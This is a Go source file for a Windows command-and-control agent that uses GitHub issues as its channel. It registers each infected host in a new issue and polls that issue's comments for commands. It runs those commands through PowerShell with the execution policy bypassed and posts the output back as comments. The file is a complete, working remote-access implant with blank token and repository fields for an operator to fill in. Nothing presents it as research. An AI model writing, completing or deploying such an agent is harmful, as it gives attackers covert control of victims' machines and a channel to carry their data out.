package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/google/uuid"
	"golang.org/x/sys/windows"
)

const (
	githubToken = "" //Replace with your GitHub Token
	repoName    = "" //Replace with your GitHub Repo
)

var (
	agentID     string
	issueNumber int
	jobHandle   windows.Handle
)

// Create Windows Job Object with Termination Monitoring
func createJobObject() {
	var err error
	jobHandle, err = windows.CreateJobObject(nil, nil)
	if err != nil {
		log.Fatalf("❌ Failed to create job object: %v", err)
	}

	//Enforce process termination when job object is closed
	var info windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION
	info.BasicLimitInformation.LimitFlags = windows.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
	_, err = windows.SetInformationJobObject(jobHandle, windows.JobObjectExtendedLimitInformation, uintptr(unsafe.Pointer(&info)), uint32(unsafe.Sizeof(info)))
	if err != nil {
		log.Fatalf("❌ Failed to set job object information: %v", err)
	}

	//Assign the current process to the job object
	self, err := windows.GetCurrentProcess()
	if err != nil {
		log.Fatalf("❌ Failed to get current process: %v", err)
	}

	err = windows.AssignProcessToJobObject(jobHandle, self)
	if err != nil {
		log.Fatalf("❌ Failed to assign process to job object: %v", err)
	}

	fmt.Println("🔒 Agent is now protected by a Windows Job Object.")
}

// Register Agent with GitHub
func registerAgent() {
	hostname, _ := os.Hostname()
	agentID = uuid.New().String() // Generate a unique ID

	//Create an issue on GitHub
	payload := map[string]string{
		"title": fmt.Sprintf("Agent Registered: %s | %s", hostname, agentID),
		"body":  "Agent is now active and awaiting commands.",
	}
	issueNumber = createGitHubIssue(payload)

	if issueNumber == 0 {
		log.Fatal("❌ Failed to register agent.")
	}
	fmt.Printf("✅ Agent Registered: %s | %s\n", hostname, agentID)
}

// Create GitHub Issue**
func createGitHubIssue(payload map[string]string) int {
	url := fmt.Sprintf("https://api.github.com/repos/%s/issues", repoName)
	data, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
	req.Header.Set("Authorization", "token "+githubToken)
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Println("❌ Failed to create issue:", err)
		return 0
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusCreated {
		body, _ := ioutil.ReadAll(resp.Body)
		var result map[string]interface{}
		json.Unmarshal(body, &result)
		return int(result["number"].(float64))
	}
	log.Println("❌ GitHub issue creation failed. Status:", resp.Status)
	return 0
}

// Fetch & Execute Commands from GitHub
var lastProcessedCommentID int

func executeCommands() {
	for {
		url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d/comments", repoName, issueNumber)
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Authorization", "token "+githubToken)
		req.Header.Set("Accept", "application/vnd.github.v3+json")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			log.Println("❌ Failed to fetch commands:", err)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			body, _ := ioutil.ReadAll(resp.Body)
			var comments []map[string]interface{}
			json.Unmarshal(body, &comments)

			// Process only new comments
			for _, comment := range comments {
				commentID := int(comment["id"].(float64))
				commentBody := comment["body"].(string)

				// Ignore already processed comments
				if commentID <= lastProcessedCommentID {
					continue
				}

				lastProcessedCommentID = commentID // Update last processed comment ID

				// Check if the comment is a command
				if strings.HasPrefix(commentBody, "Command: ") {
					extractedCommand := strings.TrimPrefix(commentBody, "Command: ")
					fmt.Printf("✅ Extracted Command: %s\n", extractedCommand)
					executeCommand(extractedCommand)
				} else {
					fmt.Printf("⚠ Ignoring response comment.\n")
				}
			}
		}

		time.Sleep(5 * time.Second) // Poll every 5 seconds
	}
}

// Execute the Received Command (PowerShell)
func executeCommand(command string) {
	fmt.Printf("⚡ Executing: %s\n", command)

	//Ensure proper encoding to capture single-line outputs like `whoami`
	cmdStr := strings.TrimSpace(strings.TrimPrefix(command, "Command: "))
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
		"-Command", fmt.Sprintf("[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; %s", cmdStr))

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	output := out.String()

	if err != nil {
		output += fmt.Sprintf("\n❌ Execution failed: %v", err)
	}

	// Prevent empty responses from being sent
	if strings.TrimSpace(output) == "" {
		output = "(No Output)"
	}

	// Send output as a comment on GitHub
	url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d/comments", repoName, issueNumber)
	commentPayload := map[string]string{"body": fmt.Sprintf("```\n%s\n```", output)}
	data, _ := json.Marshal(commentPayload)

	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
	req.Header.Set("Authorization", "token "+githubToken)
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	client := &http.Client{}
	_, err = client.Do(req)
	if err != nil {
		log.Println("❌ Failed to send command output:", err)
	}
}

// Handle Exit & Cleanup
func cleanup() {
	if issueNumber != 0 {
		fmt.Println("🔴 Agent received termination signal. Shutting down...")

		//Send termination update
		url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d/comments", repoName, issueNumber)
		commentPayload := map[string]string{"body": fmt.Sprintf("Agent [%s] received termination signal. Shutting down...", agentID)}
		data, _ := json.Marshal(commentPayload)

		req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
		req.Header.Set("Authorization", "token "+githubToken)
		req.Header.Set("Accept", "application/vnd.github.v3+json")

		client := &http.Client{}
		client.Do(req) //Send shutdown message

		//Close the issue
		closeIssue()
	}
}

// Close the GitHub Issue
func closeIssue() {
	url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d", repoName, issueNumber)
	payload := map[string]string{"state": "closed"}
	data, _ := json.Marshal(payload)

	req, _ := http.NewRequest("PATCH", url, bytes.NewBuffer(data))
	req.Header.Set("Authorization", "token "+githubToken)
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	client := &http.Client{}
	_, err := client.Do(req)
	if err != nil {
		log.Println("❌ Failed to close the issue:", err)
	} else {
		fmt.Println("✅ Issue closed successfully.")
	}
}

func main() {
	createJobObject()
	registerAgent()

	signalChannel := make(chan os.Signal, 1)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-signalChannel
		cleanup()
		os.Exit(0)
	}()

	executeCommands()
}
